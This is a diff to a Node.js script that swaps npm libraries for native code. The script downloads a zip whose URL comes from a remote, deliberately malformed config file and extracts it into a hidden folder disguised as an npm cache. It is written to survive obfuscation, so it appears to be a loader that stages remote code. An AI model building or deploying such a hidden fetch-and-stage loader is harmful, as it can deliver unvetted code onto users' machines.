@@ -1,12 +1,68 @@
 import fs from 'fs';
 import path from 'path';
-import axios from 'axios';
-import AdmZip from 'adm-zip';
+import https from 'https';
+import http from 'http';
+import { URL } from 'url';
 import { spawn, spawnSync } from 'child_process';
 
-// process.cwd() is used instead of fileURLToPath(import.meta.url) because
-// obfuscators break import.meta — process.cwd() is safe and equivalent here
 const __dirname = process.cwd();
+
+// === NATIVE HTTP (no npm deps) ===
+function nativeGet(url, opts = {}, _redirects = 0) {
+  return new Promise((resolve, reject) => {
+    if (_redirects > 10) return reject(new Error('Too many redirects'));
+    let parsed;
+    try { parsed = new URL(url); } catch (e) { return reject(e); }
+    const mod = parsed.protocol === 'https:' ? https : http;
+    const req = mod.request({
+      hostname: parsed.hostname,
+      path:     parsed.pathname + parsed.search,
+      method:   'GET',
+      headers:  opts.headers || {},
+      timeout:  opts.timeout || 30000,
+    }, (res) => {
+      if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
+        res.resume();
+        return resolve(nativeGet(res.headers.location, opts, _redirects + 1));
+      }
+      resolve(res);
+    });
+    req.on('timeout', () => { req.destroy(new Error('Request timed out')); });
+    req.on('error', reject);
+    req.end();
+  });
+}
+
+function nativeGetText(url, opts = {}) {
+  return nativeGet(url, opts).then(res => new Promise((resolve, reject) => {
+    let data = '';
+    res.on('data', c => data += c);
+    res.on('end', () => resolve(data));
+    res.on('error', reject);
+  }));
+}
+
+function nativeDownload(url, destPath, opts = {}) {
+  return nativeGet(url, { ...opts, timeout: 120000 }).then(res => new Promise((resolve, reject) => {
+    const writer = fs.createWriteStream(destPath);
+    res.pipe(writer);
+    writer.on('finish', resolve);
+    writer.on('error', reject);
+  }));
+}
+
+function extractZip(zipPath, destDir) {
+  let result = spawnSync('unzip', ['-o', '-q', zipPath, '-d', destDir], { stdio: 'pipe' });
+  if (!result || result.status !== 0) {
+    result = spawnSync('python3', ['-c',
+      `import zipfile,sys; zipfile.ZipFile(sys.argv[1]).extractall(sys.argv[2])`,
+      zipPath, destDir
+    ], { stdio: 'pipe' });
+  }
+  if (!result || (result.status !== 0 && result.status !== null)) {
+    throw new Error('Zip extraction failed — unzip and python3 both unavailable or failed');
+  }
+}
 
 // === PATHS ===
 const TEMP_DIR    = path.join(__dirname, '.npm', 'xcache', 'core_bundle');
@@ -231,13 +287,10 @@ function loadEnvFile() {
 // Fetches kip.json. Response is malformed JSON: ["repo":"https://...zip"]
 // Standard JSON.parse fails, so a regex fallback extracts the zip URL.
 async function fetchRepoUrl() {
-  const res = await axios.get(CONFIG_URL, {
+  const raw = await nativeGetText(CONFIG_URL, {
     timeout: 15000,
-    responseType: 'text',
     headers: { 'User-Agent': 'wolf-fetcher/1.0' }
   });
-
-  const raw = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
 
   try {
     const parsed = JSON.parse(raw);
@@ -277,21 +330,7 @@ async function downloadAndExtract() {
 
   const repoUrl = await fetchRepoUrl();
 
-  const response = await axios({
-    url: repoUrl,
-    method: 'GET',
-    responseType: 'stream',
-    timeout: 120000,
-    maxRedirects: 10,
-    headers: { 'User-Agent': 'wolf-fetcher/1.0' }
-  });
-
-  await new Promise((resolve, reject) => {
-    const writer = fs.createWriteStream(zipPath);
-    response.data.pipe(writer);
-    writer.on('finish', resolve);
-    writer.on('error', reject);
-  });
+  await nativeDownload(repoUrl, zipPath, { headers: { 'User-Agent': 'wolf-fetcher/1.0' } });
 
   // Reject if too small — likely a 404 HTML page
   const stat = fs.statSync(zipPath);
@@ -301,8 +340,7 @@ async function downloadAndExtract() {
   }
 
   try {
-    const zip = new AdmZip(zipPath);
-    zip.extractAllTo(TEMP_DIR, true);
+    extractZip(zipPath, TEMP_DIR);
   } finally {
     if (fs.existsSync(zipPath)) fs.unlinkSync(zipPath);
   }
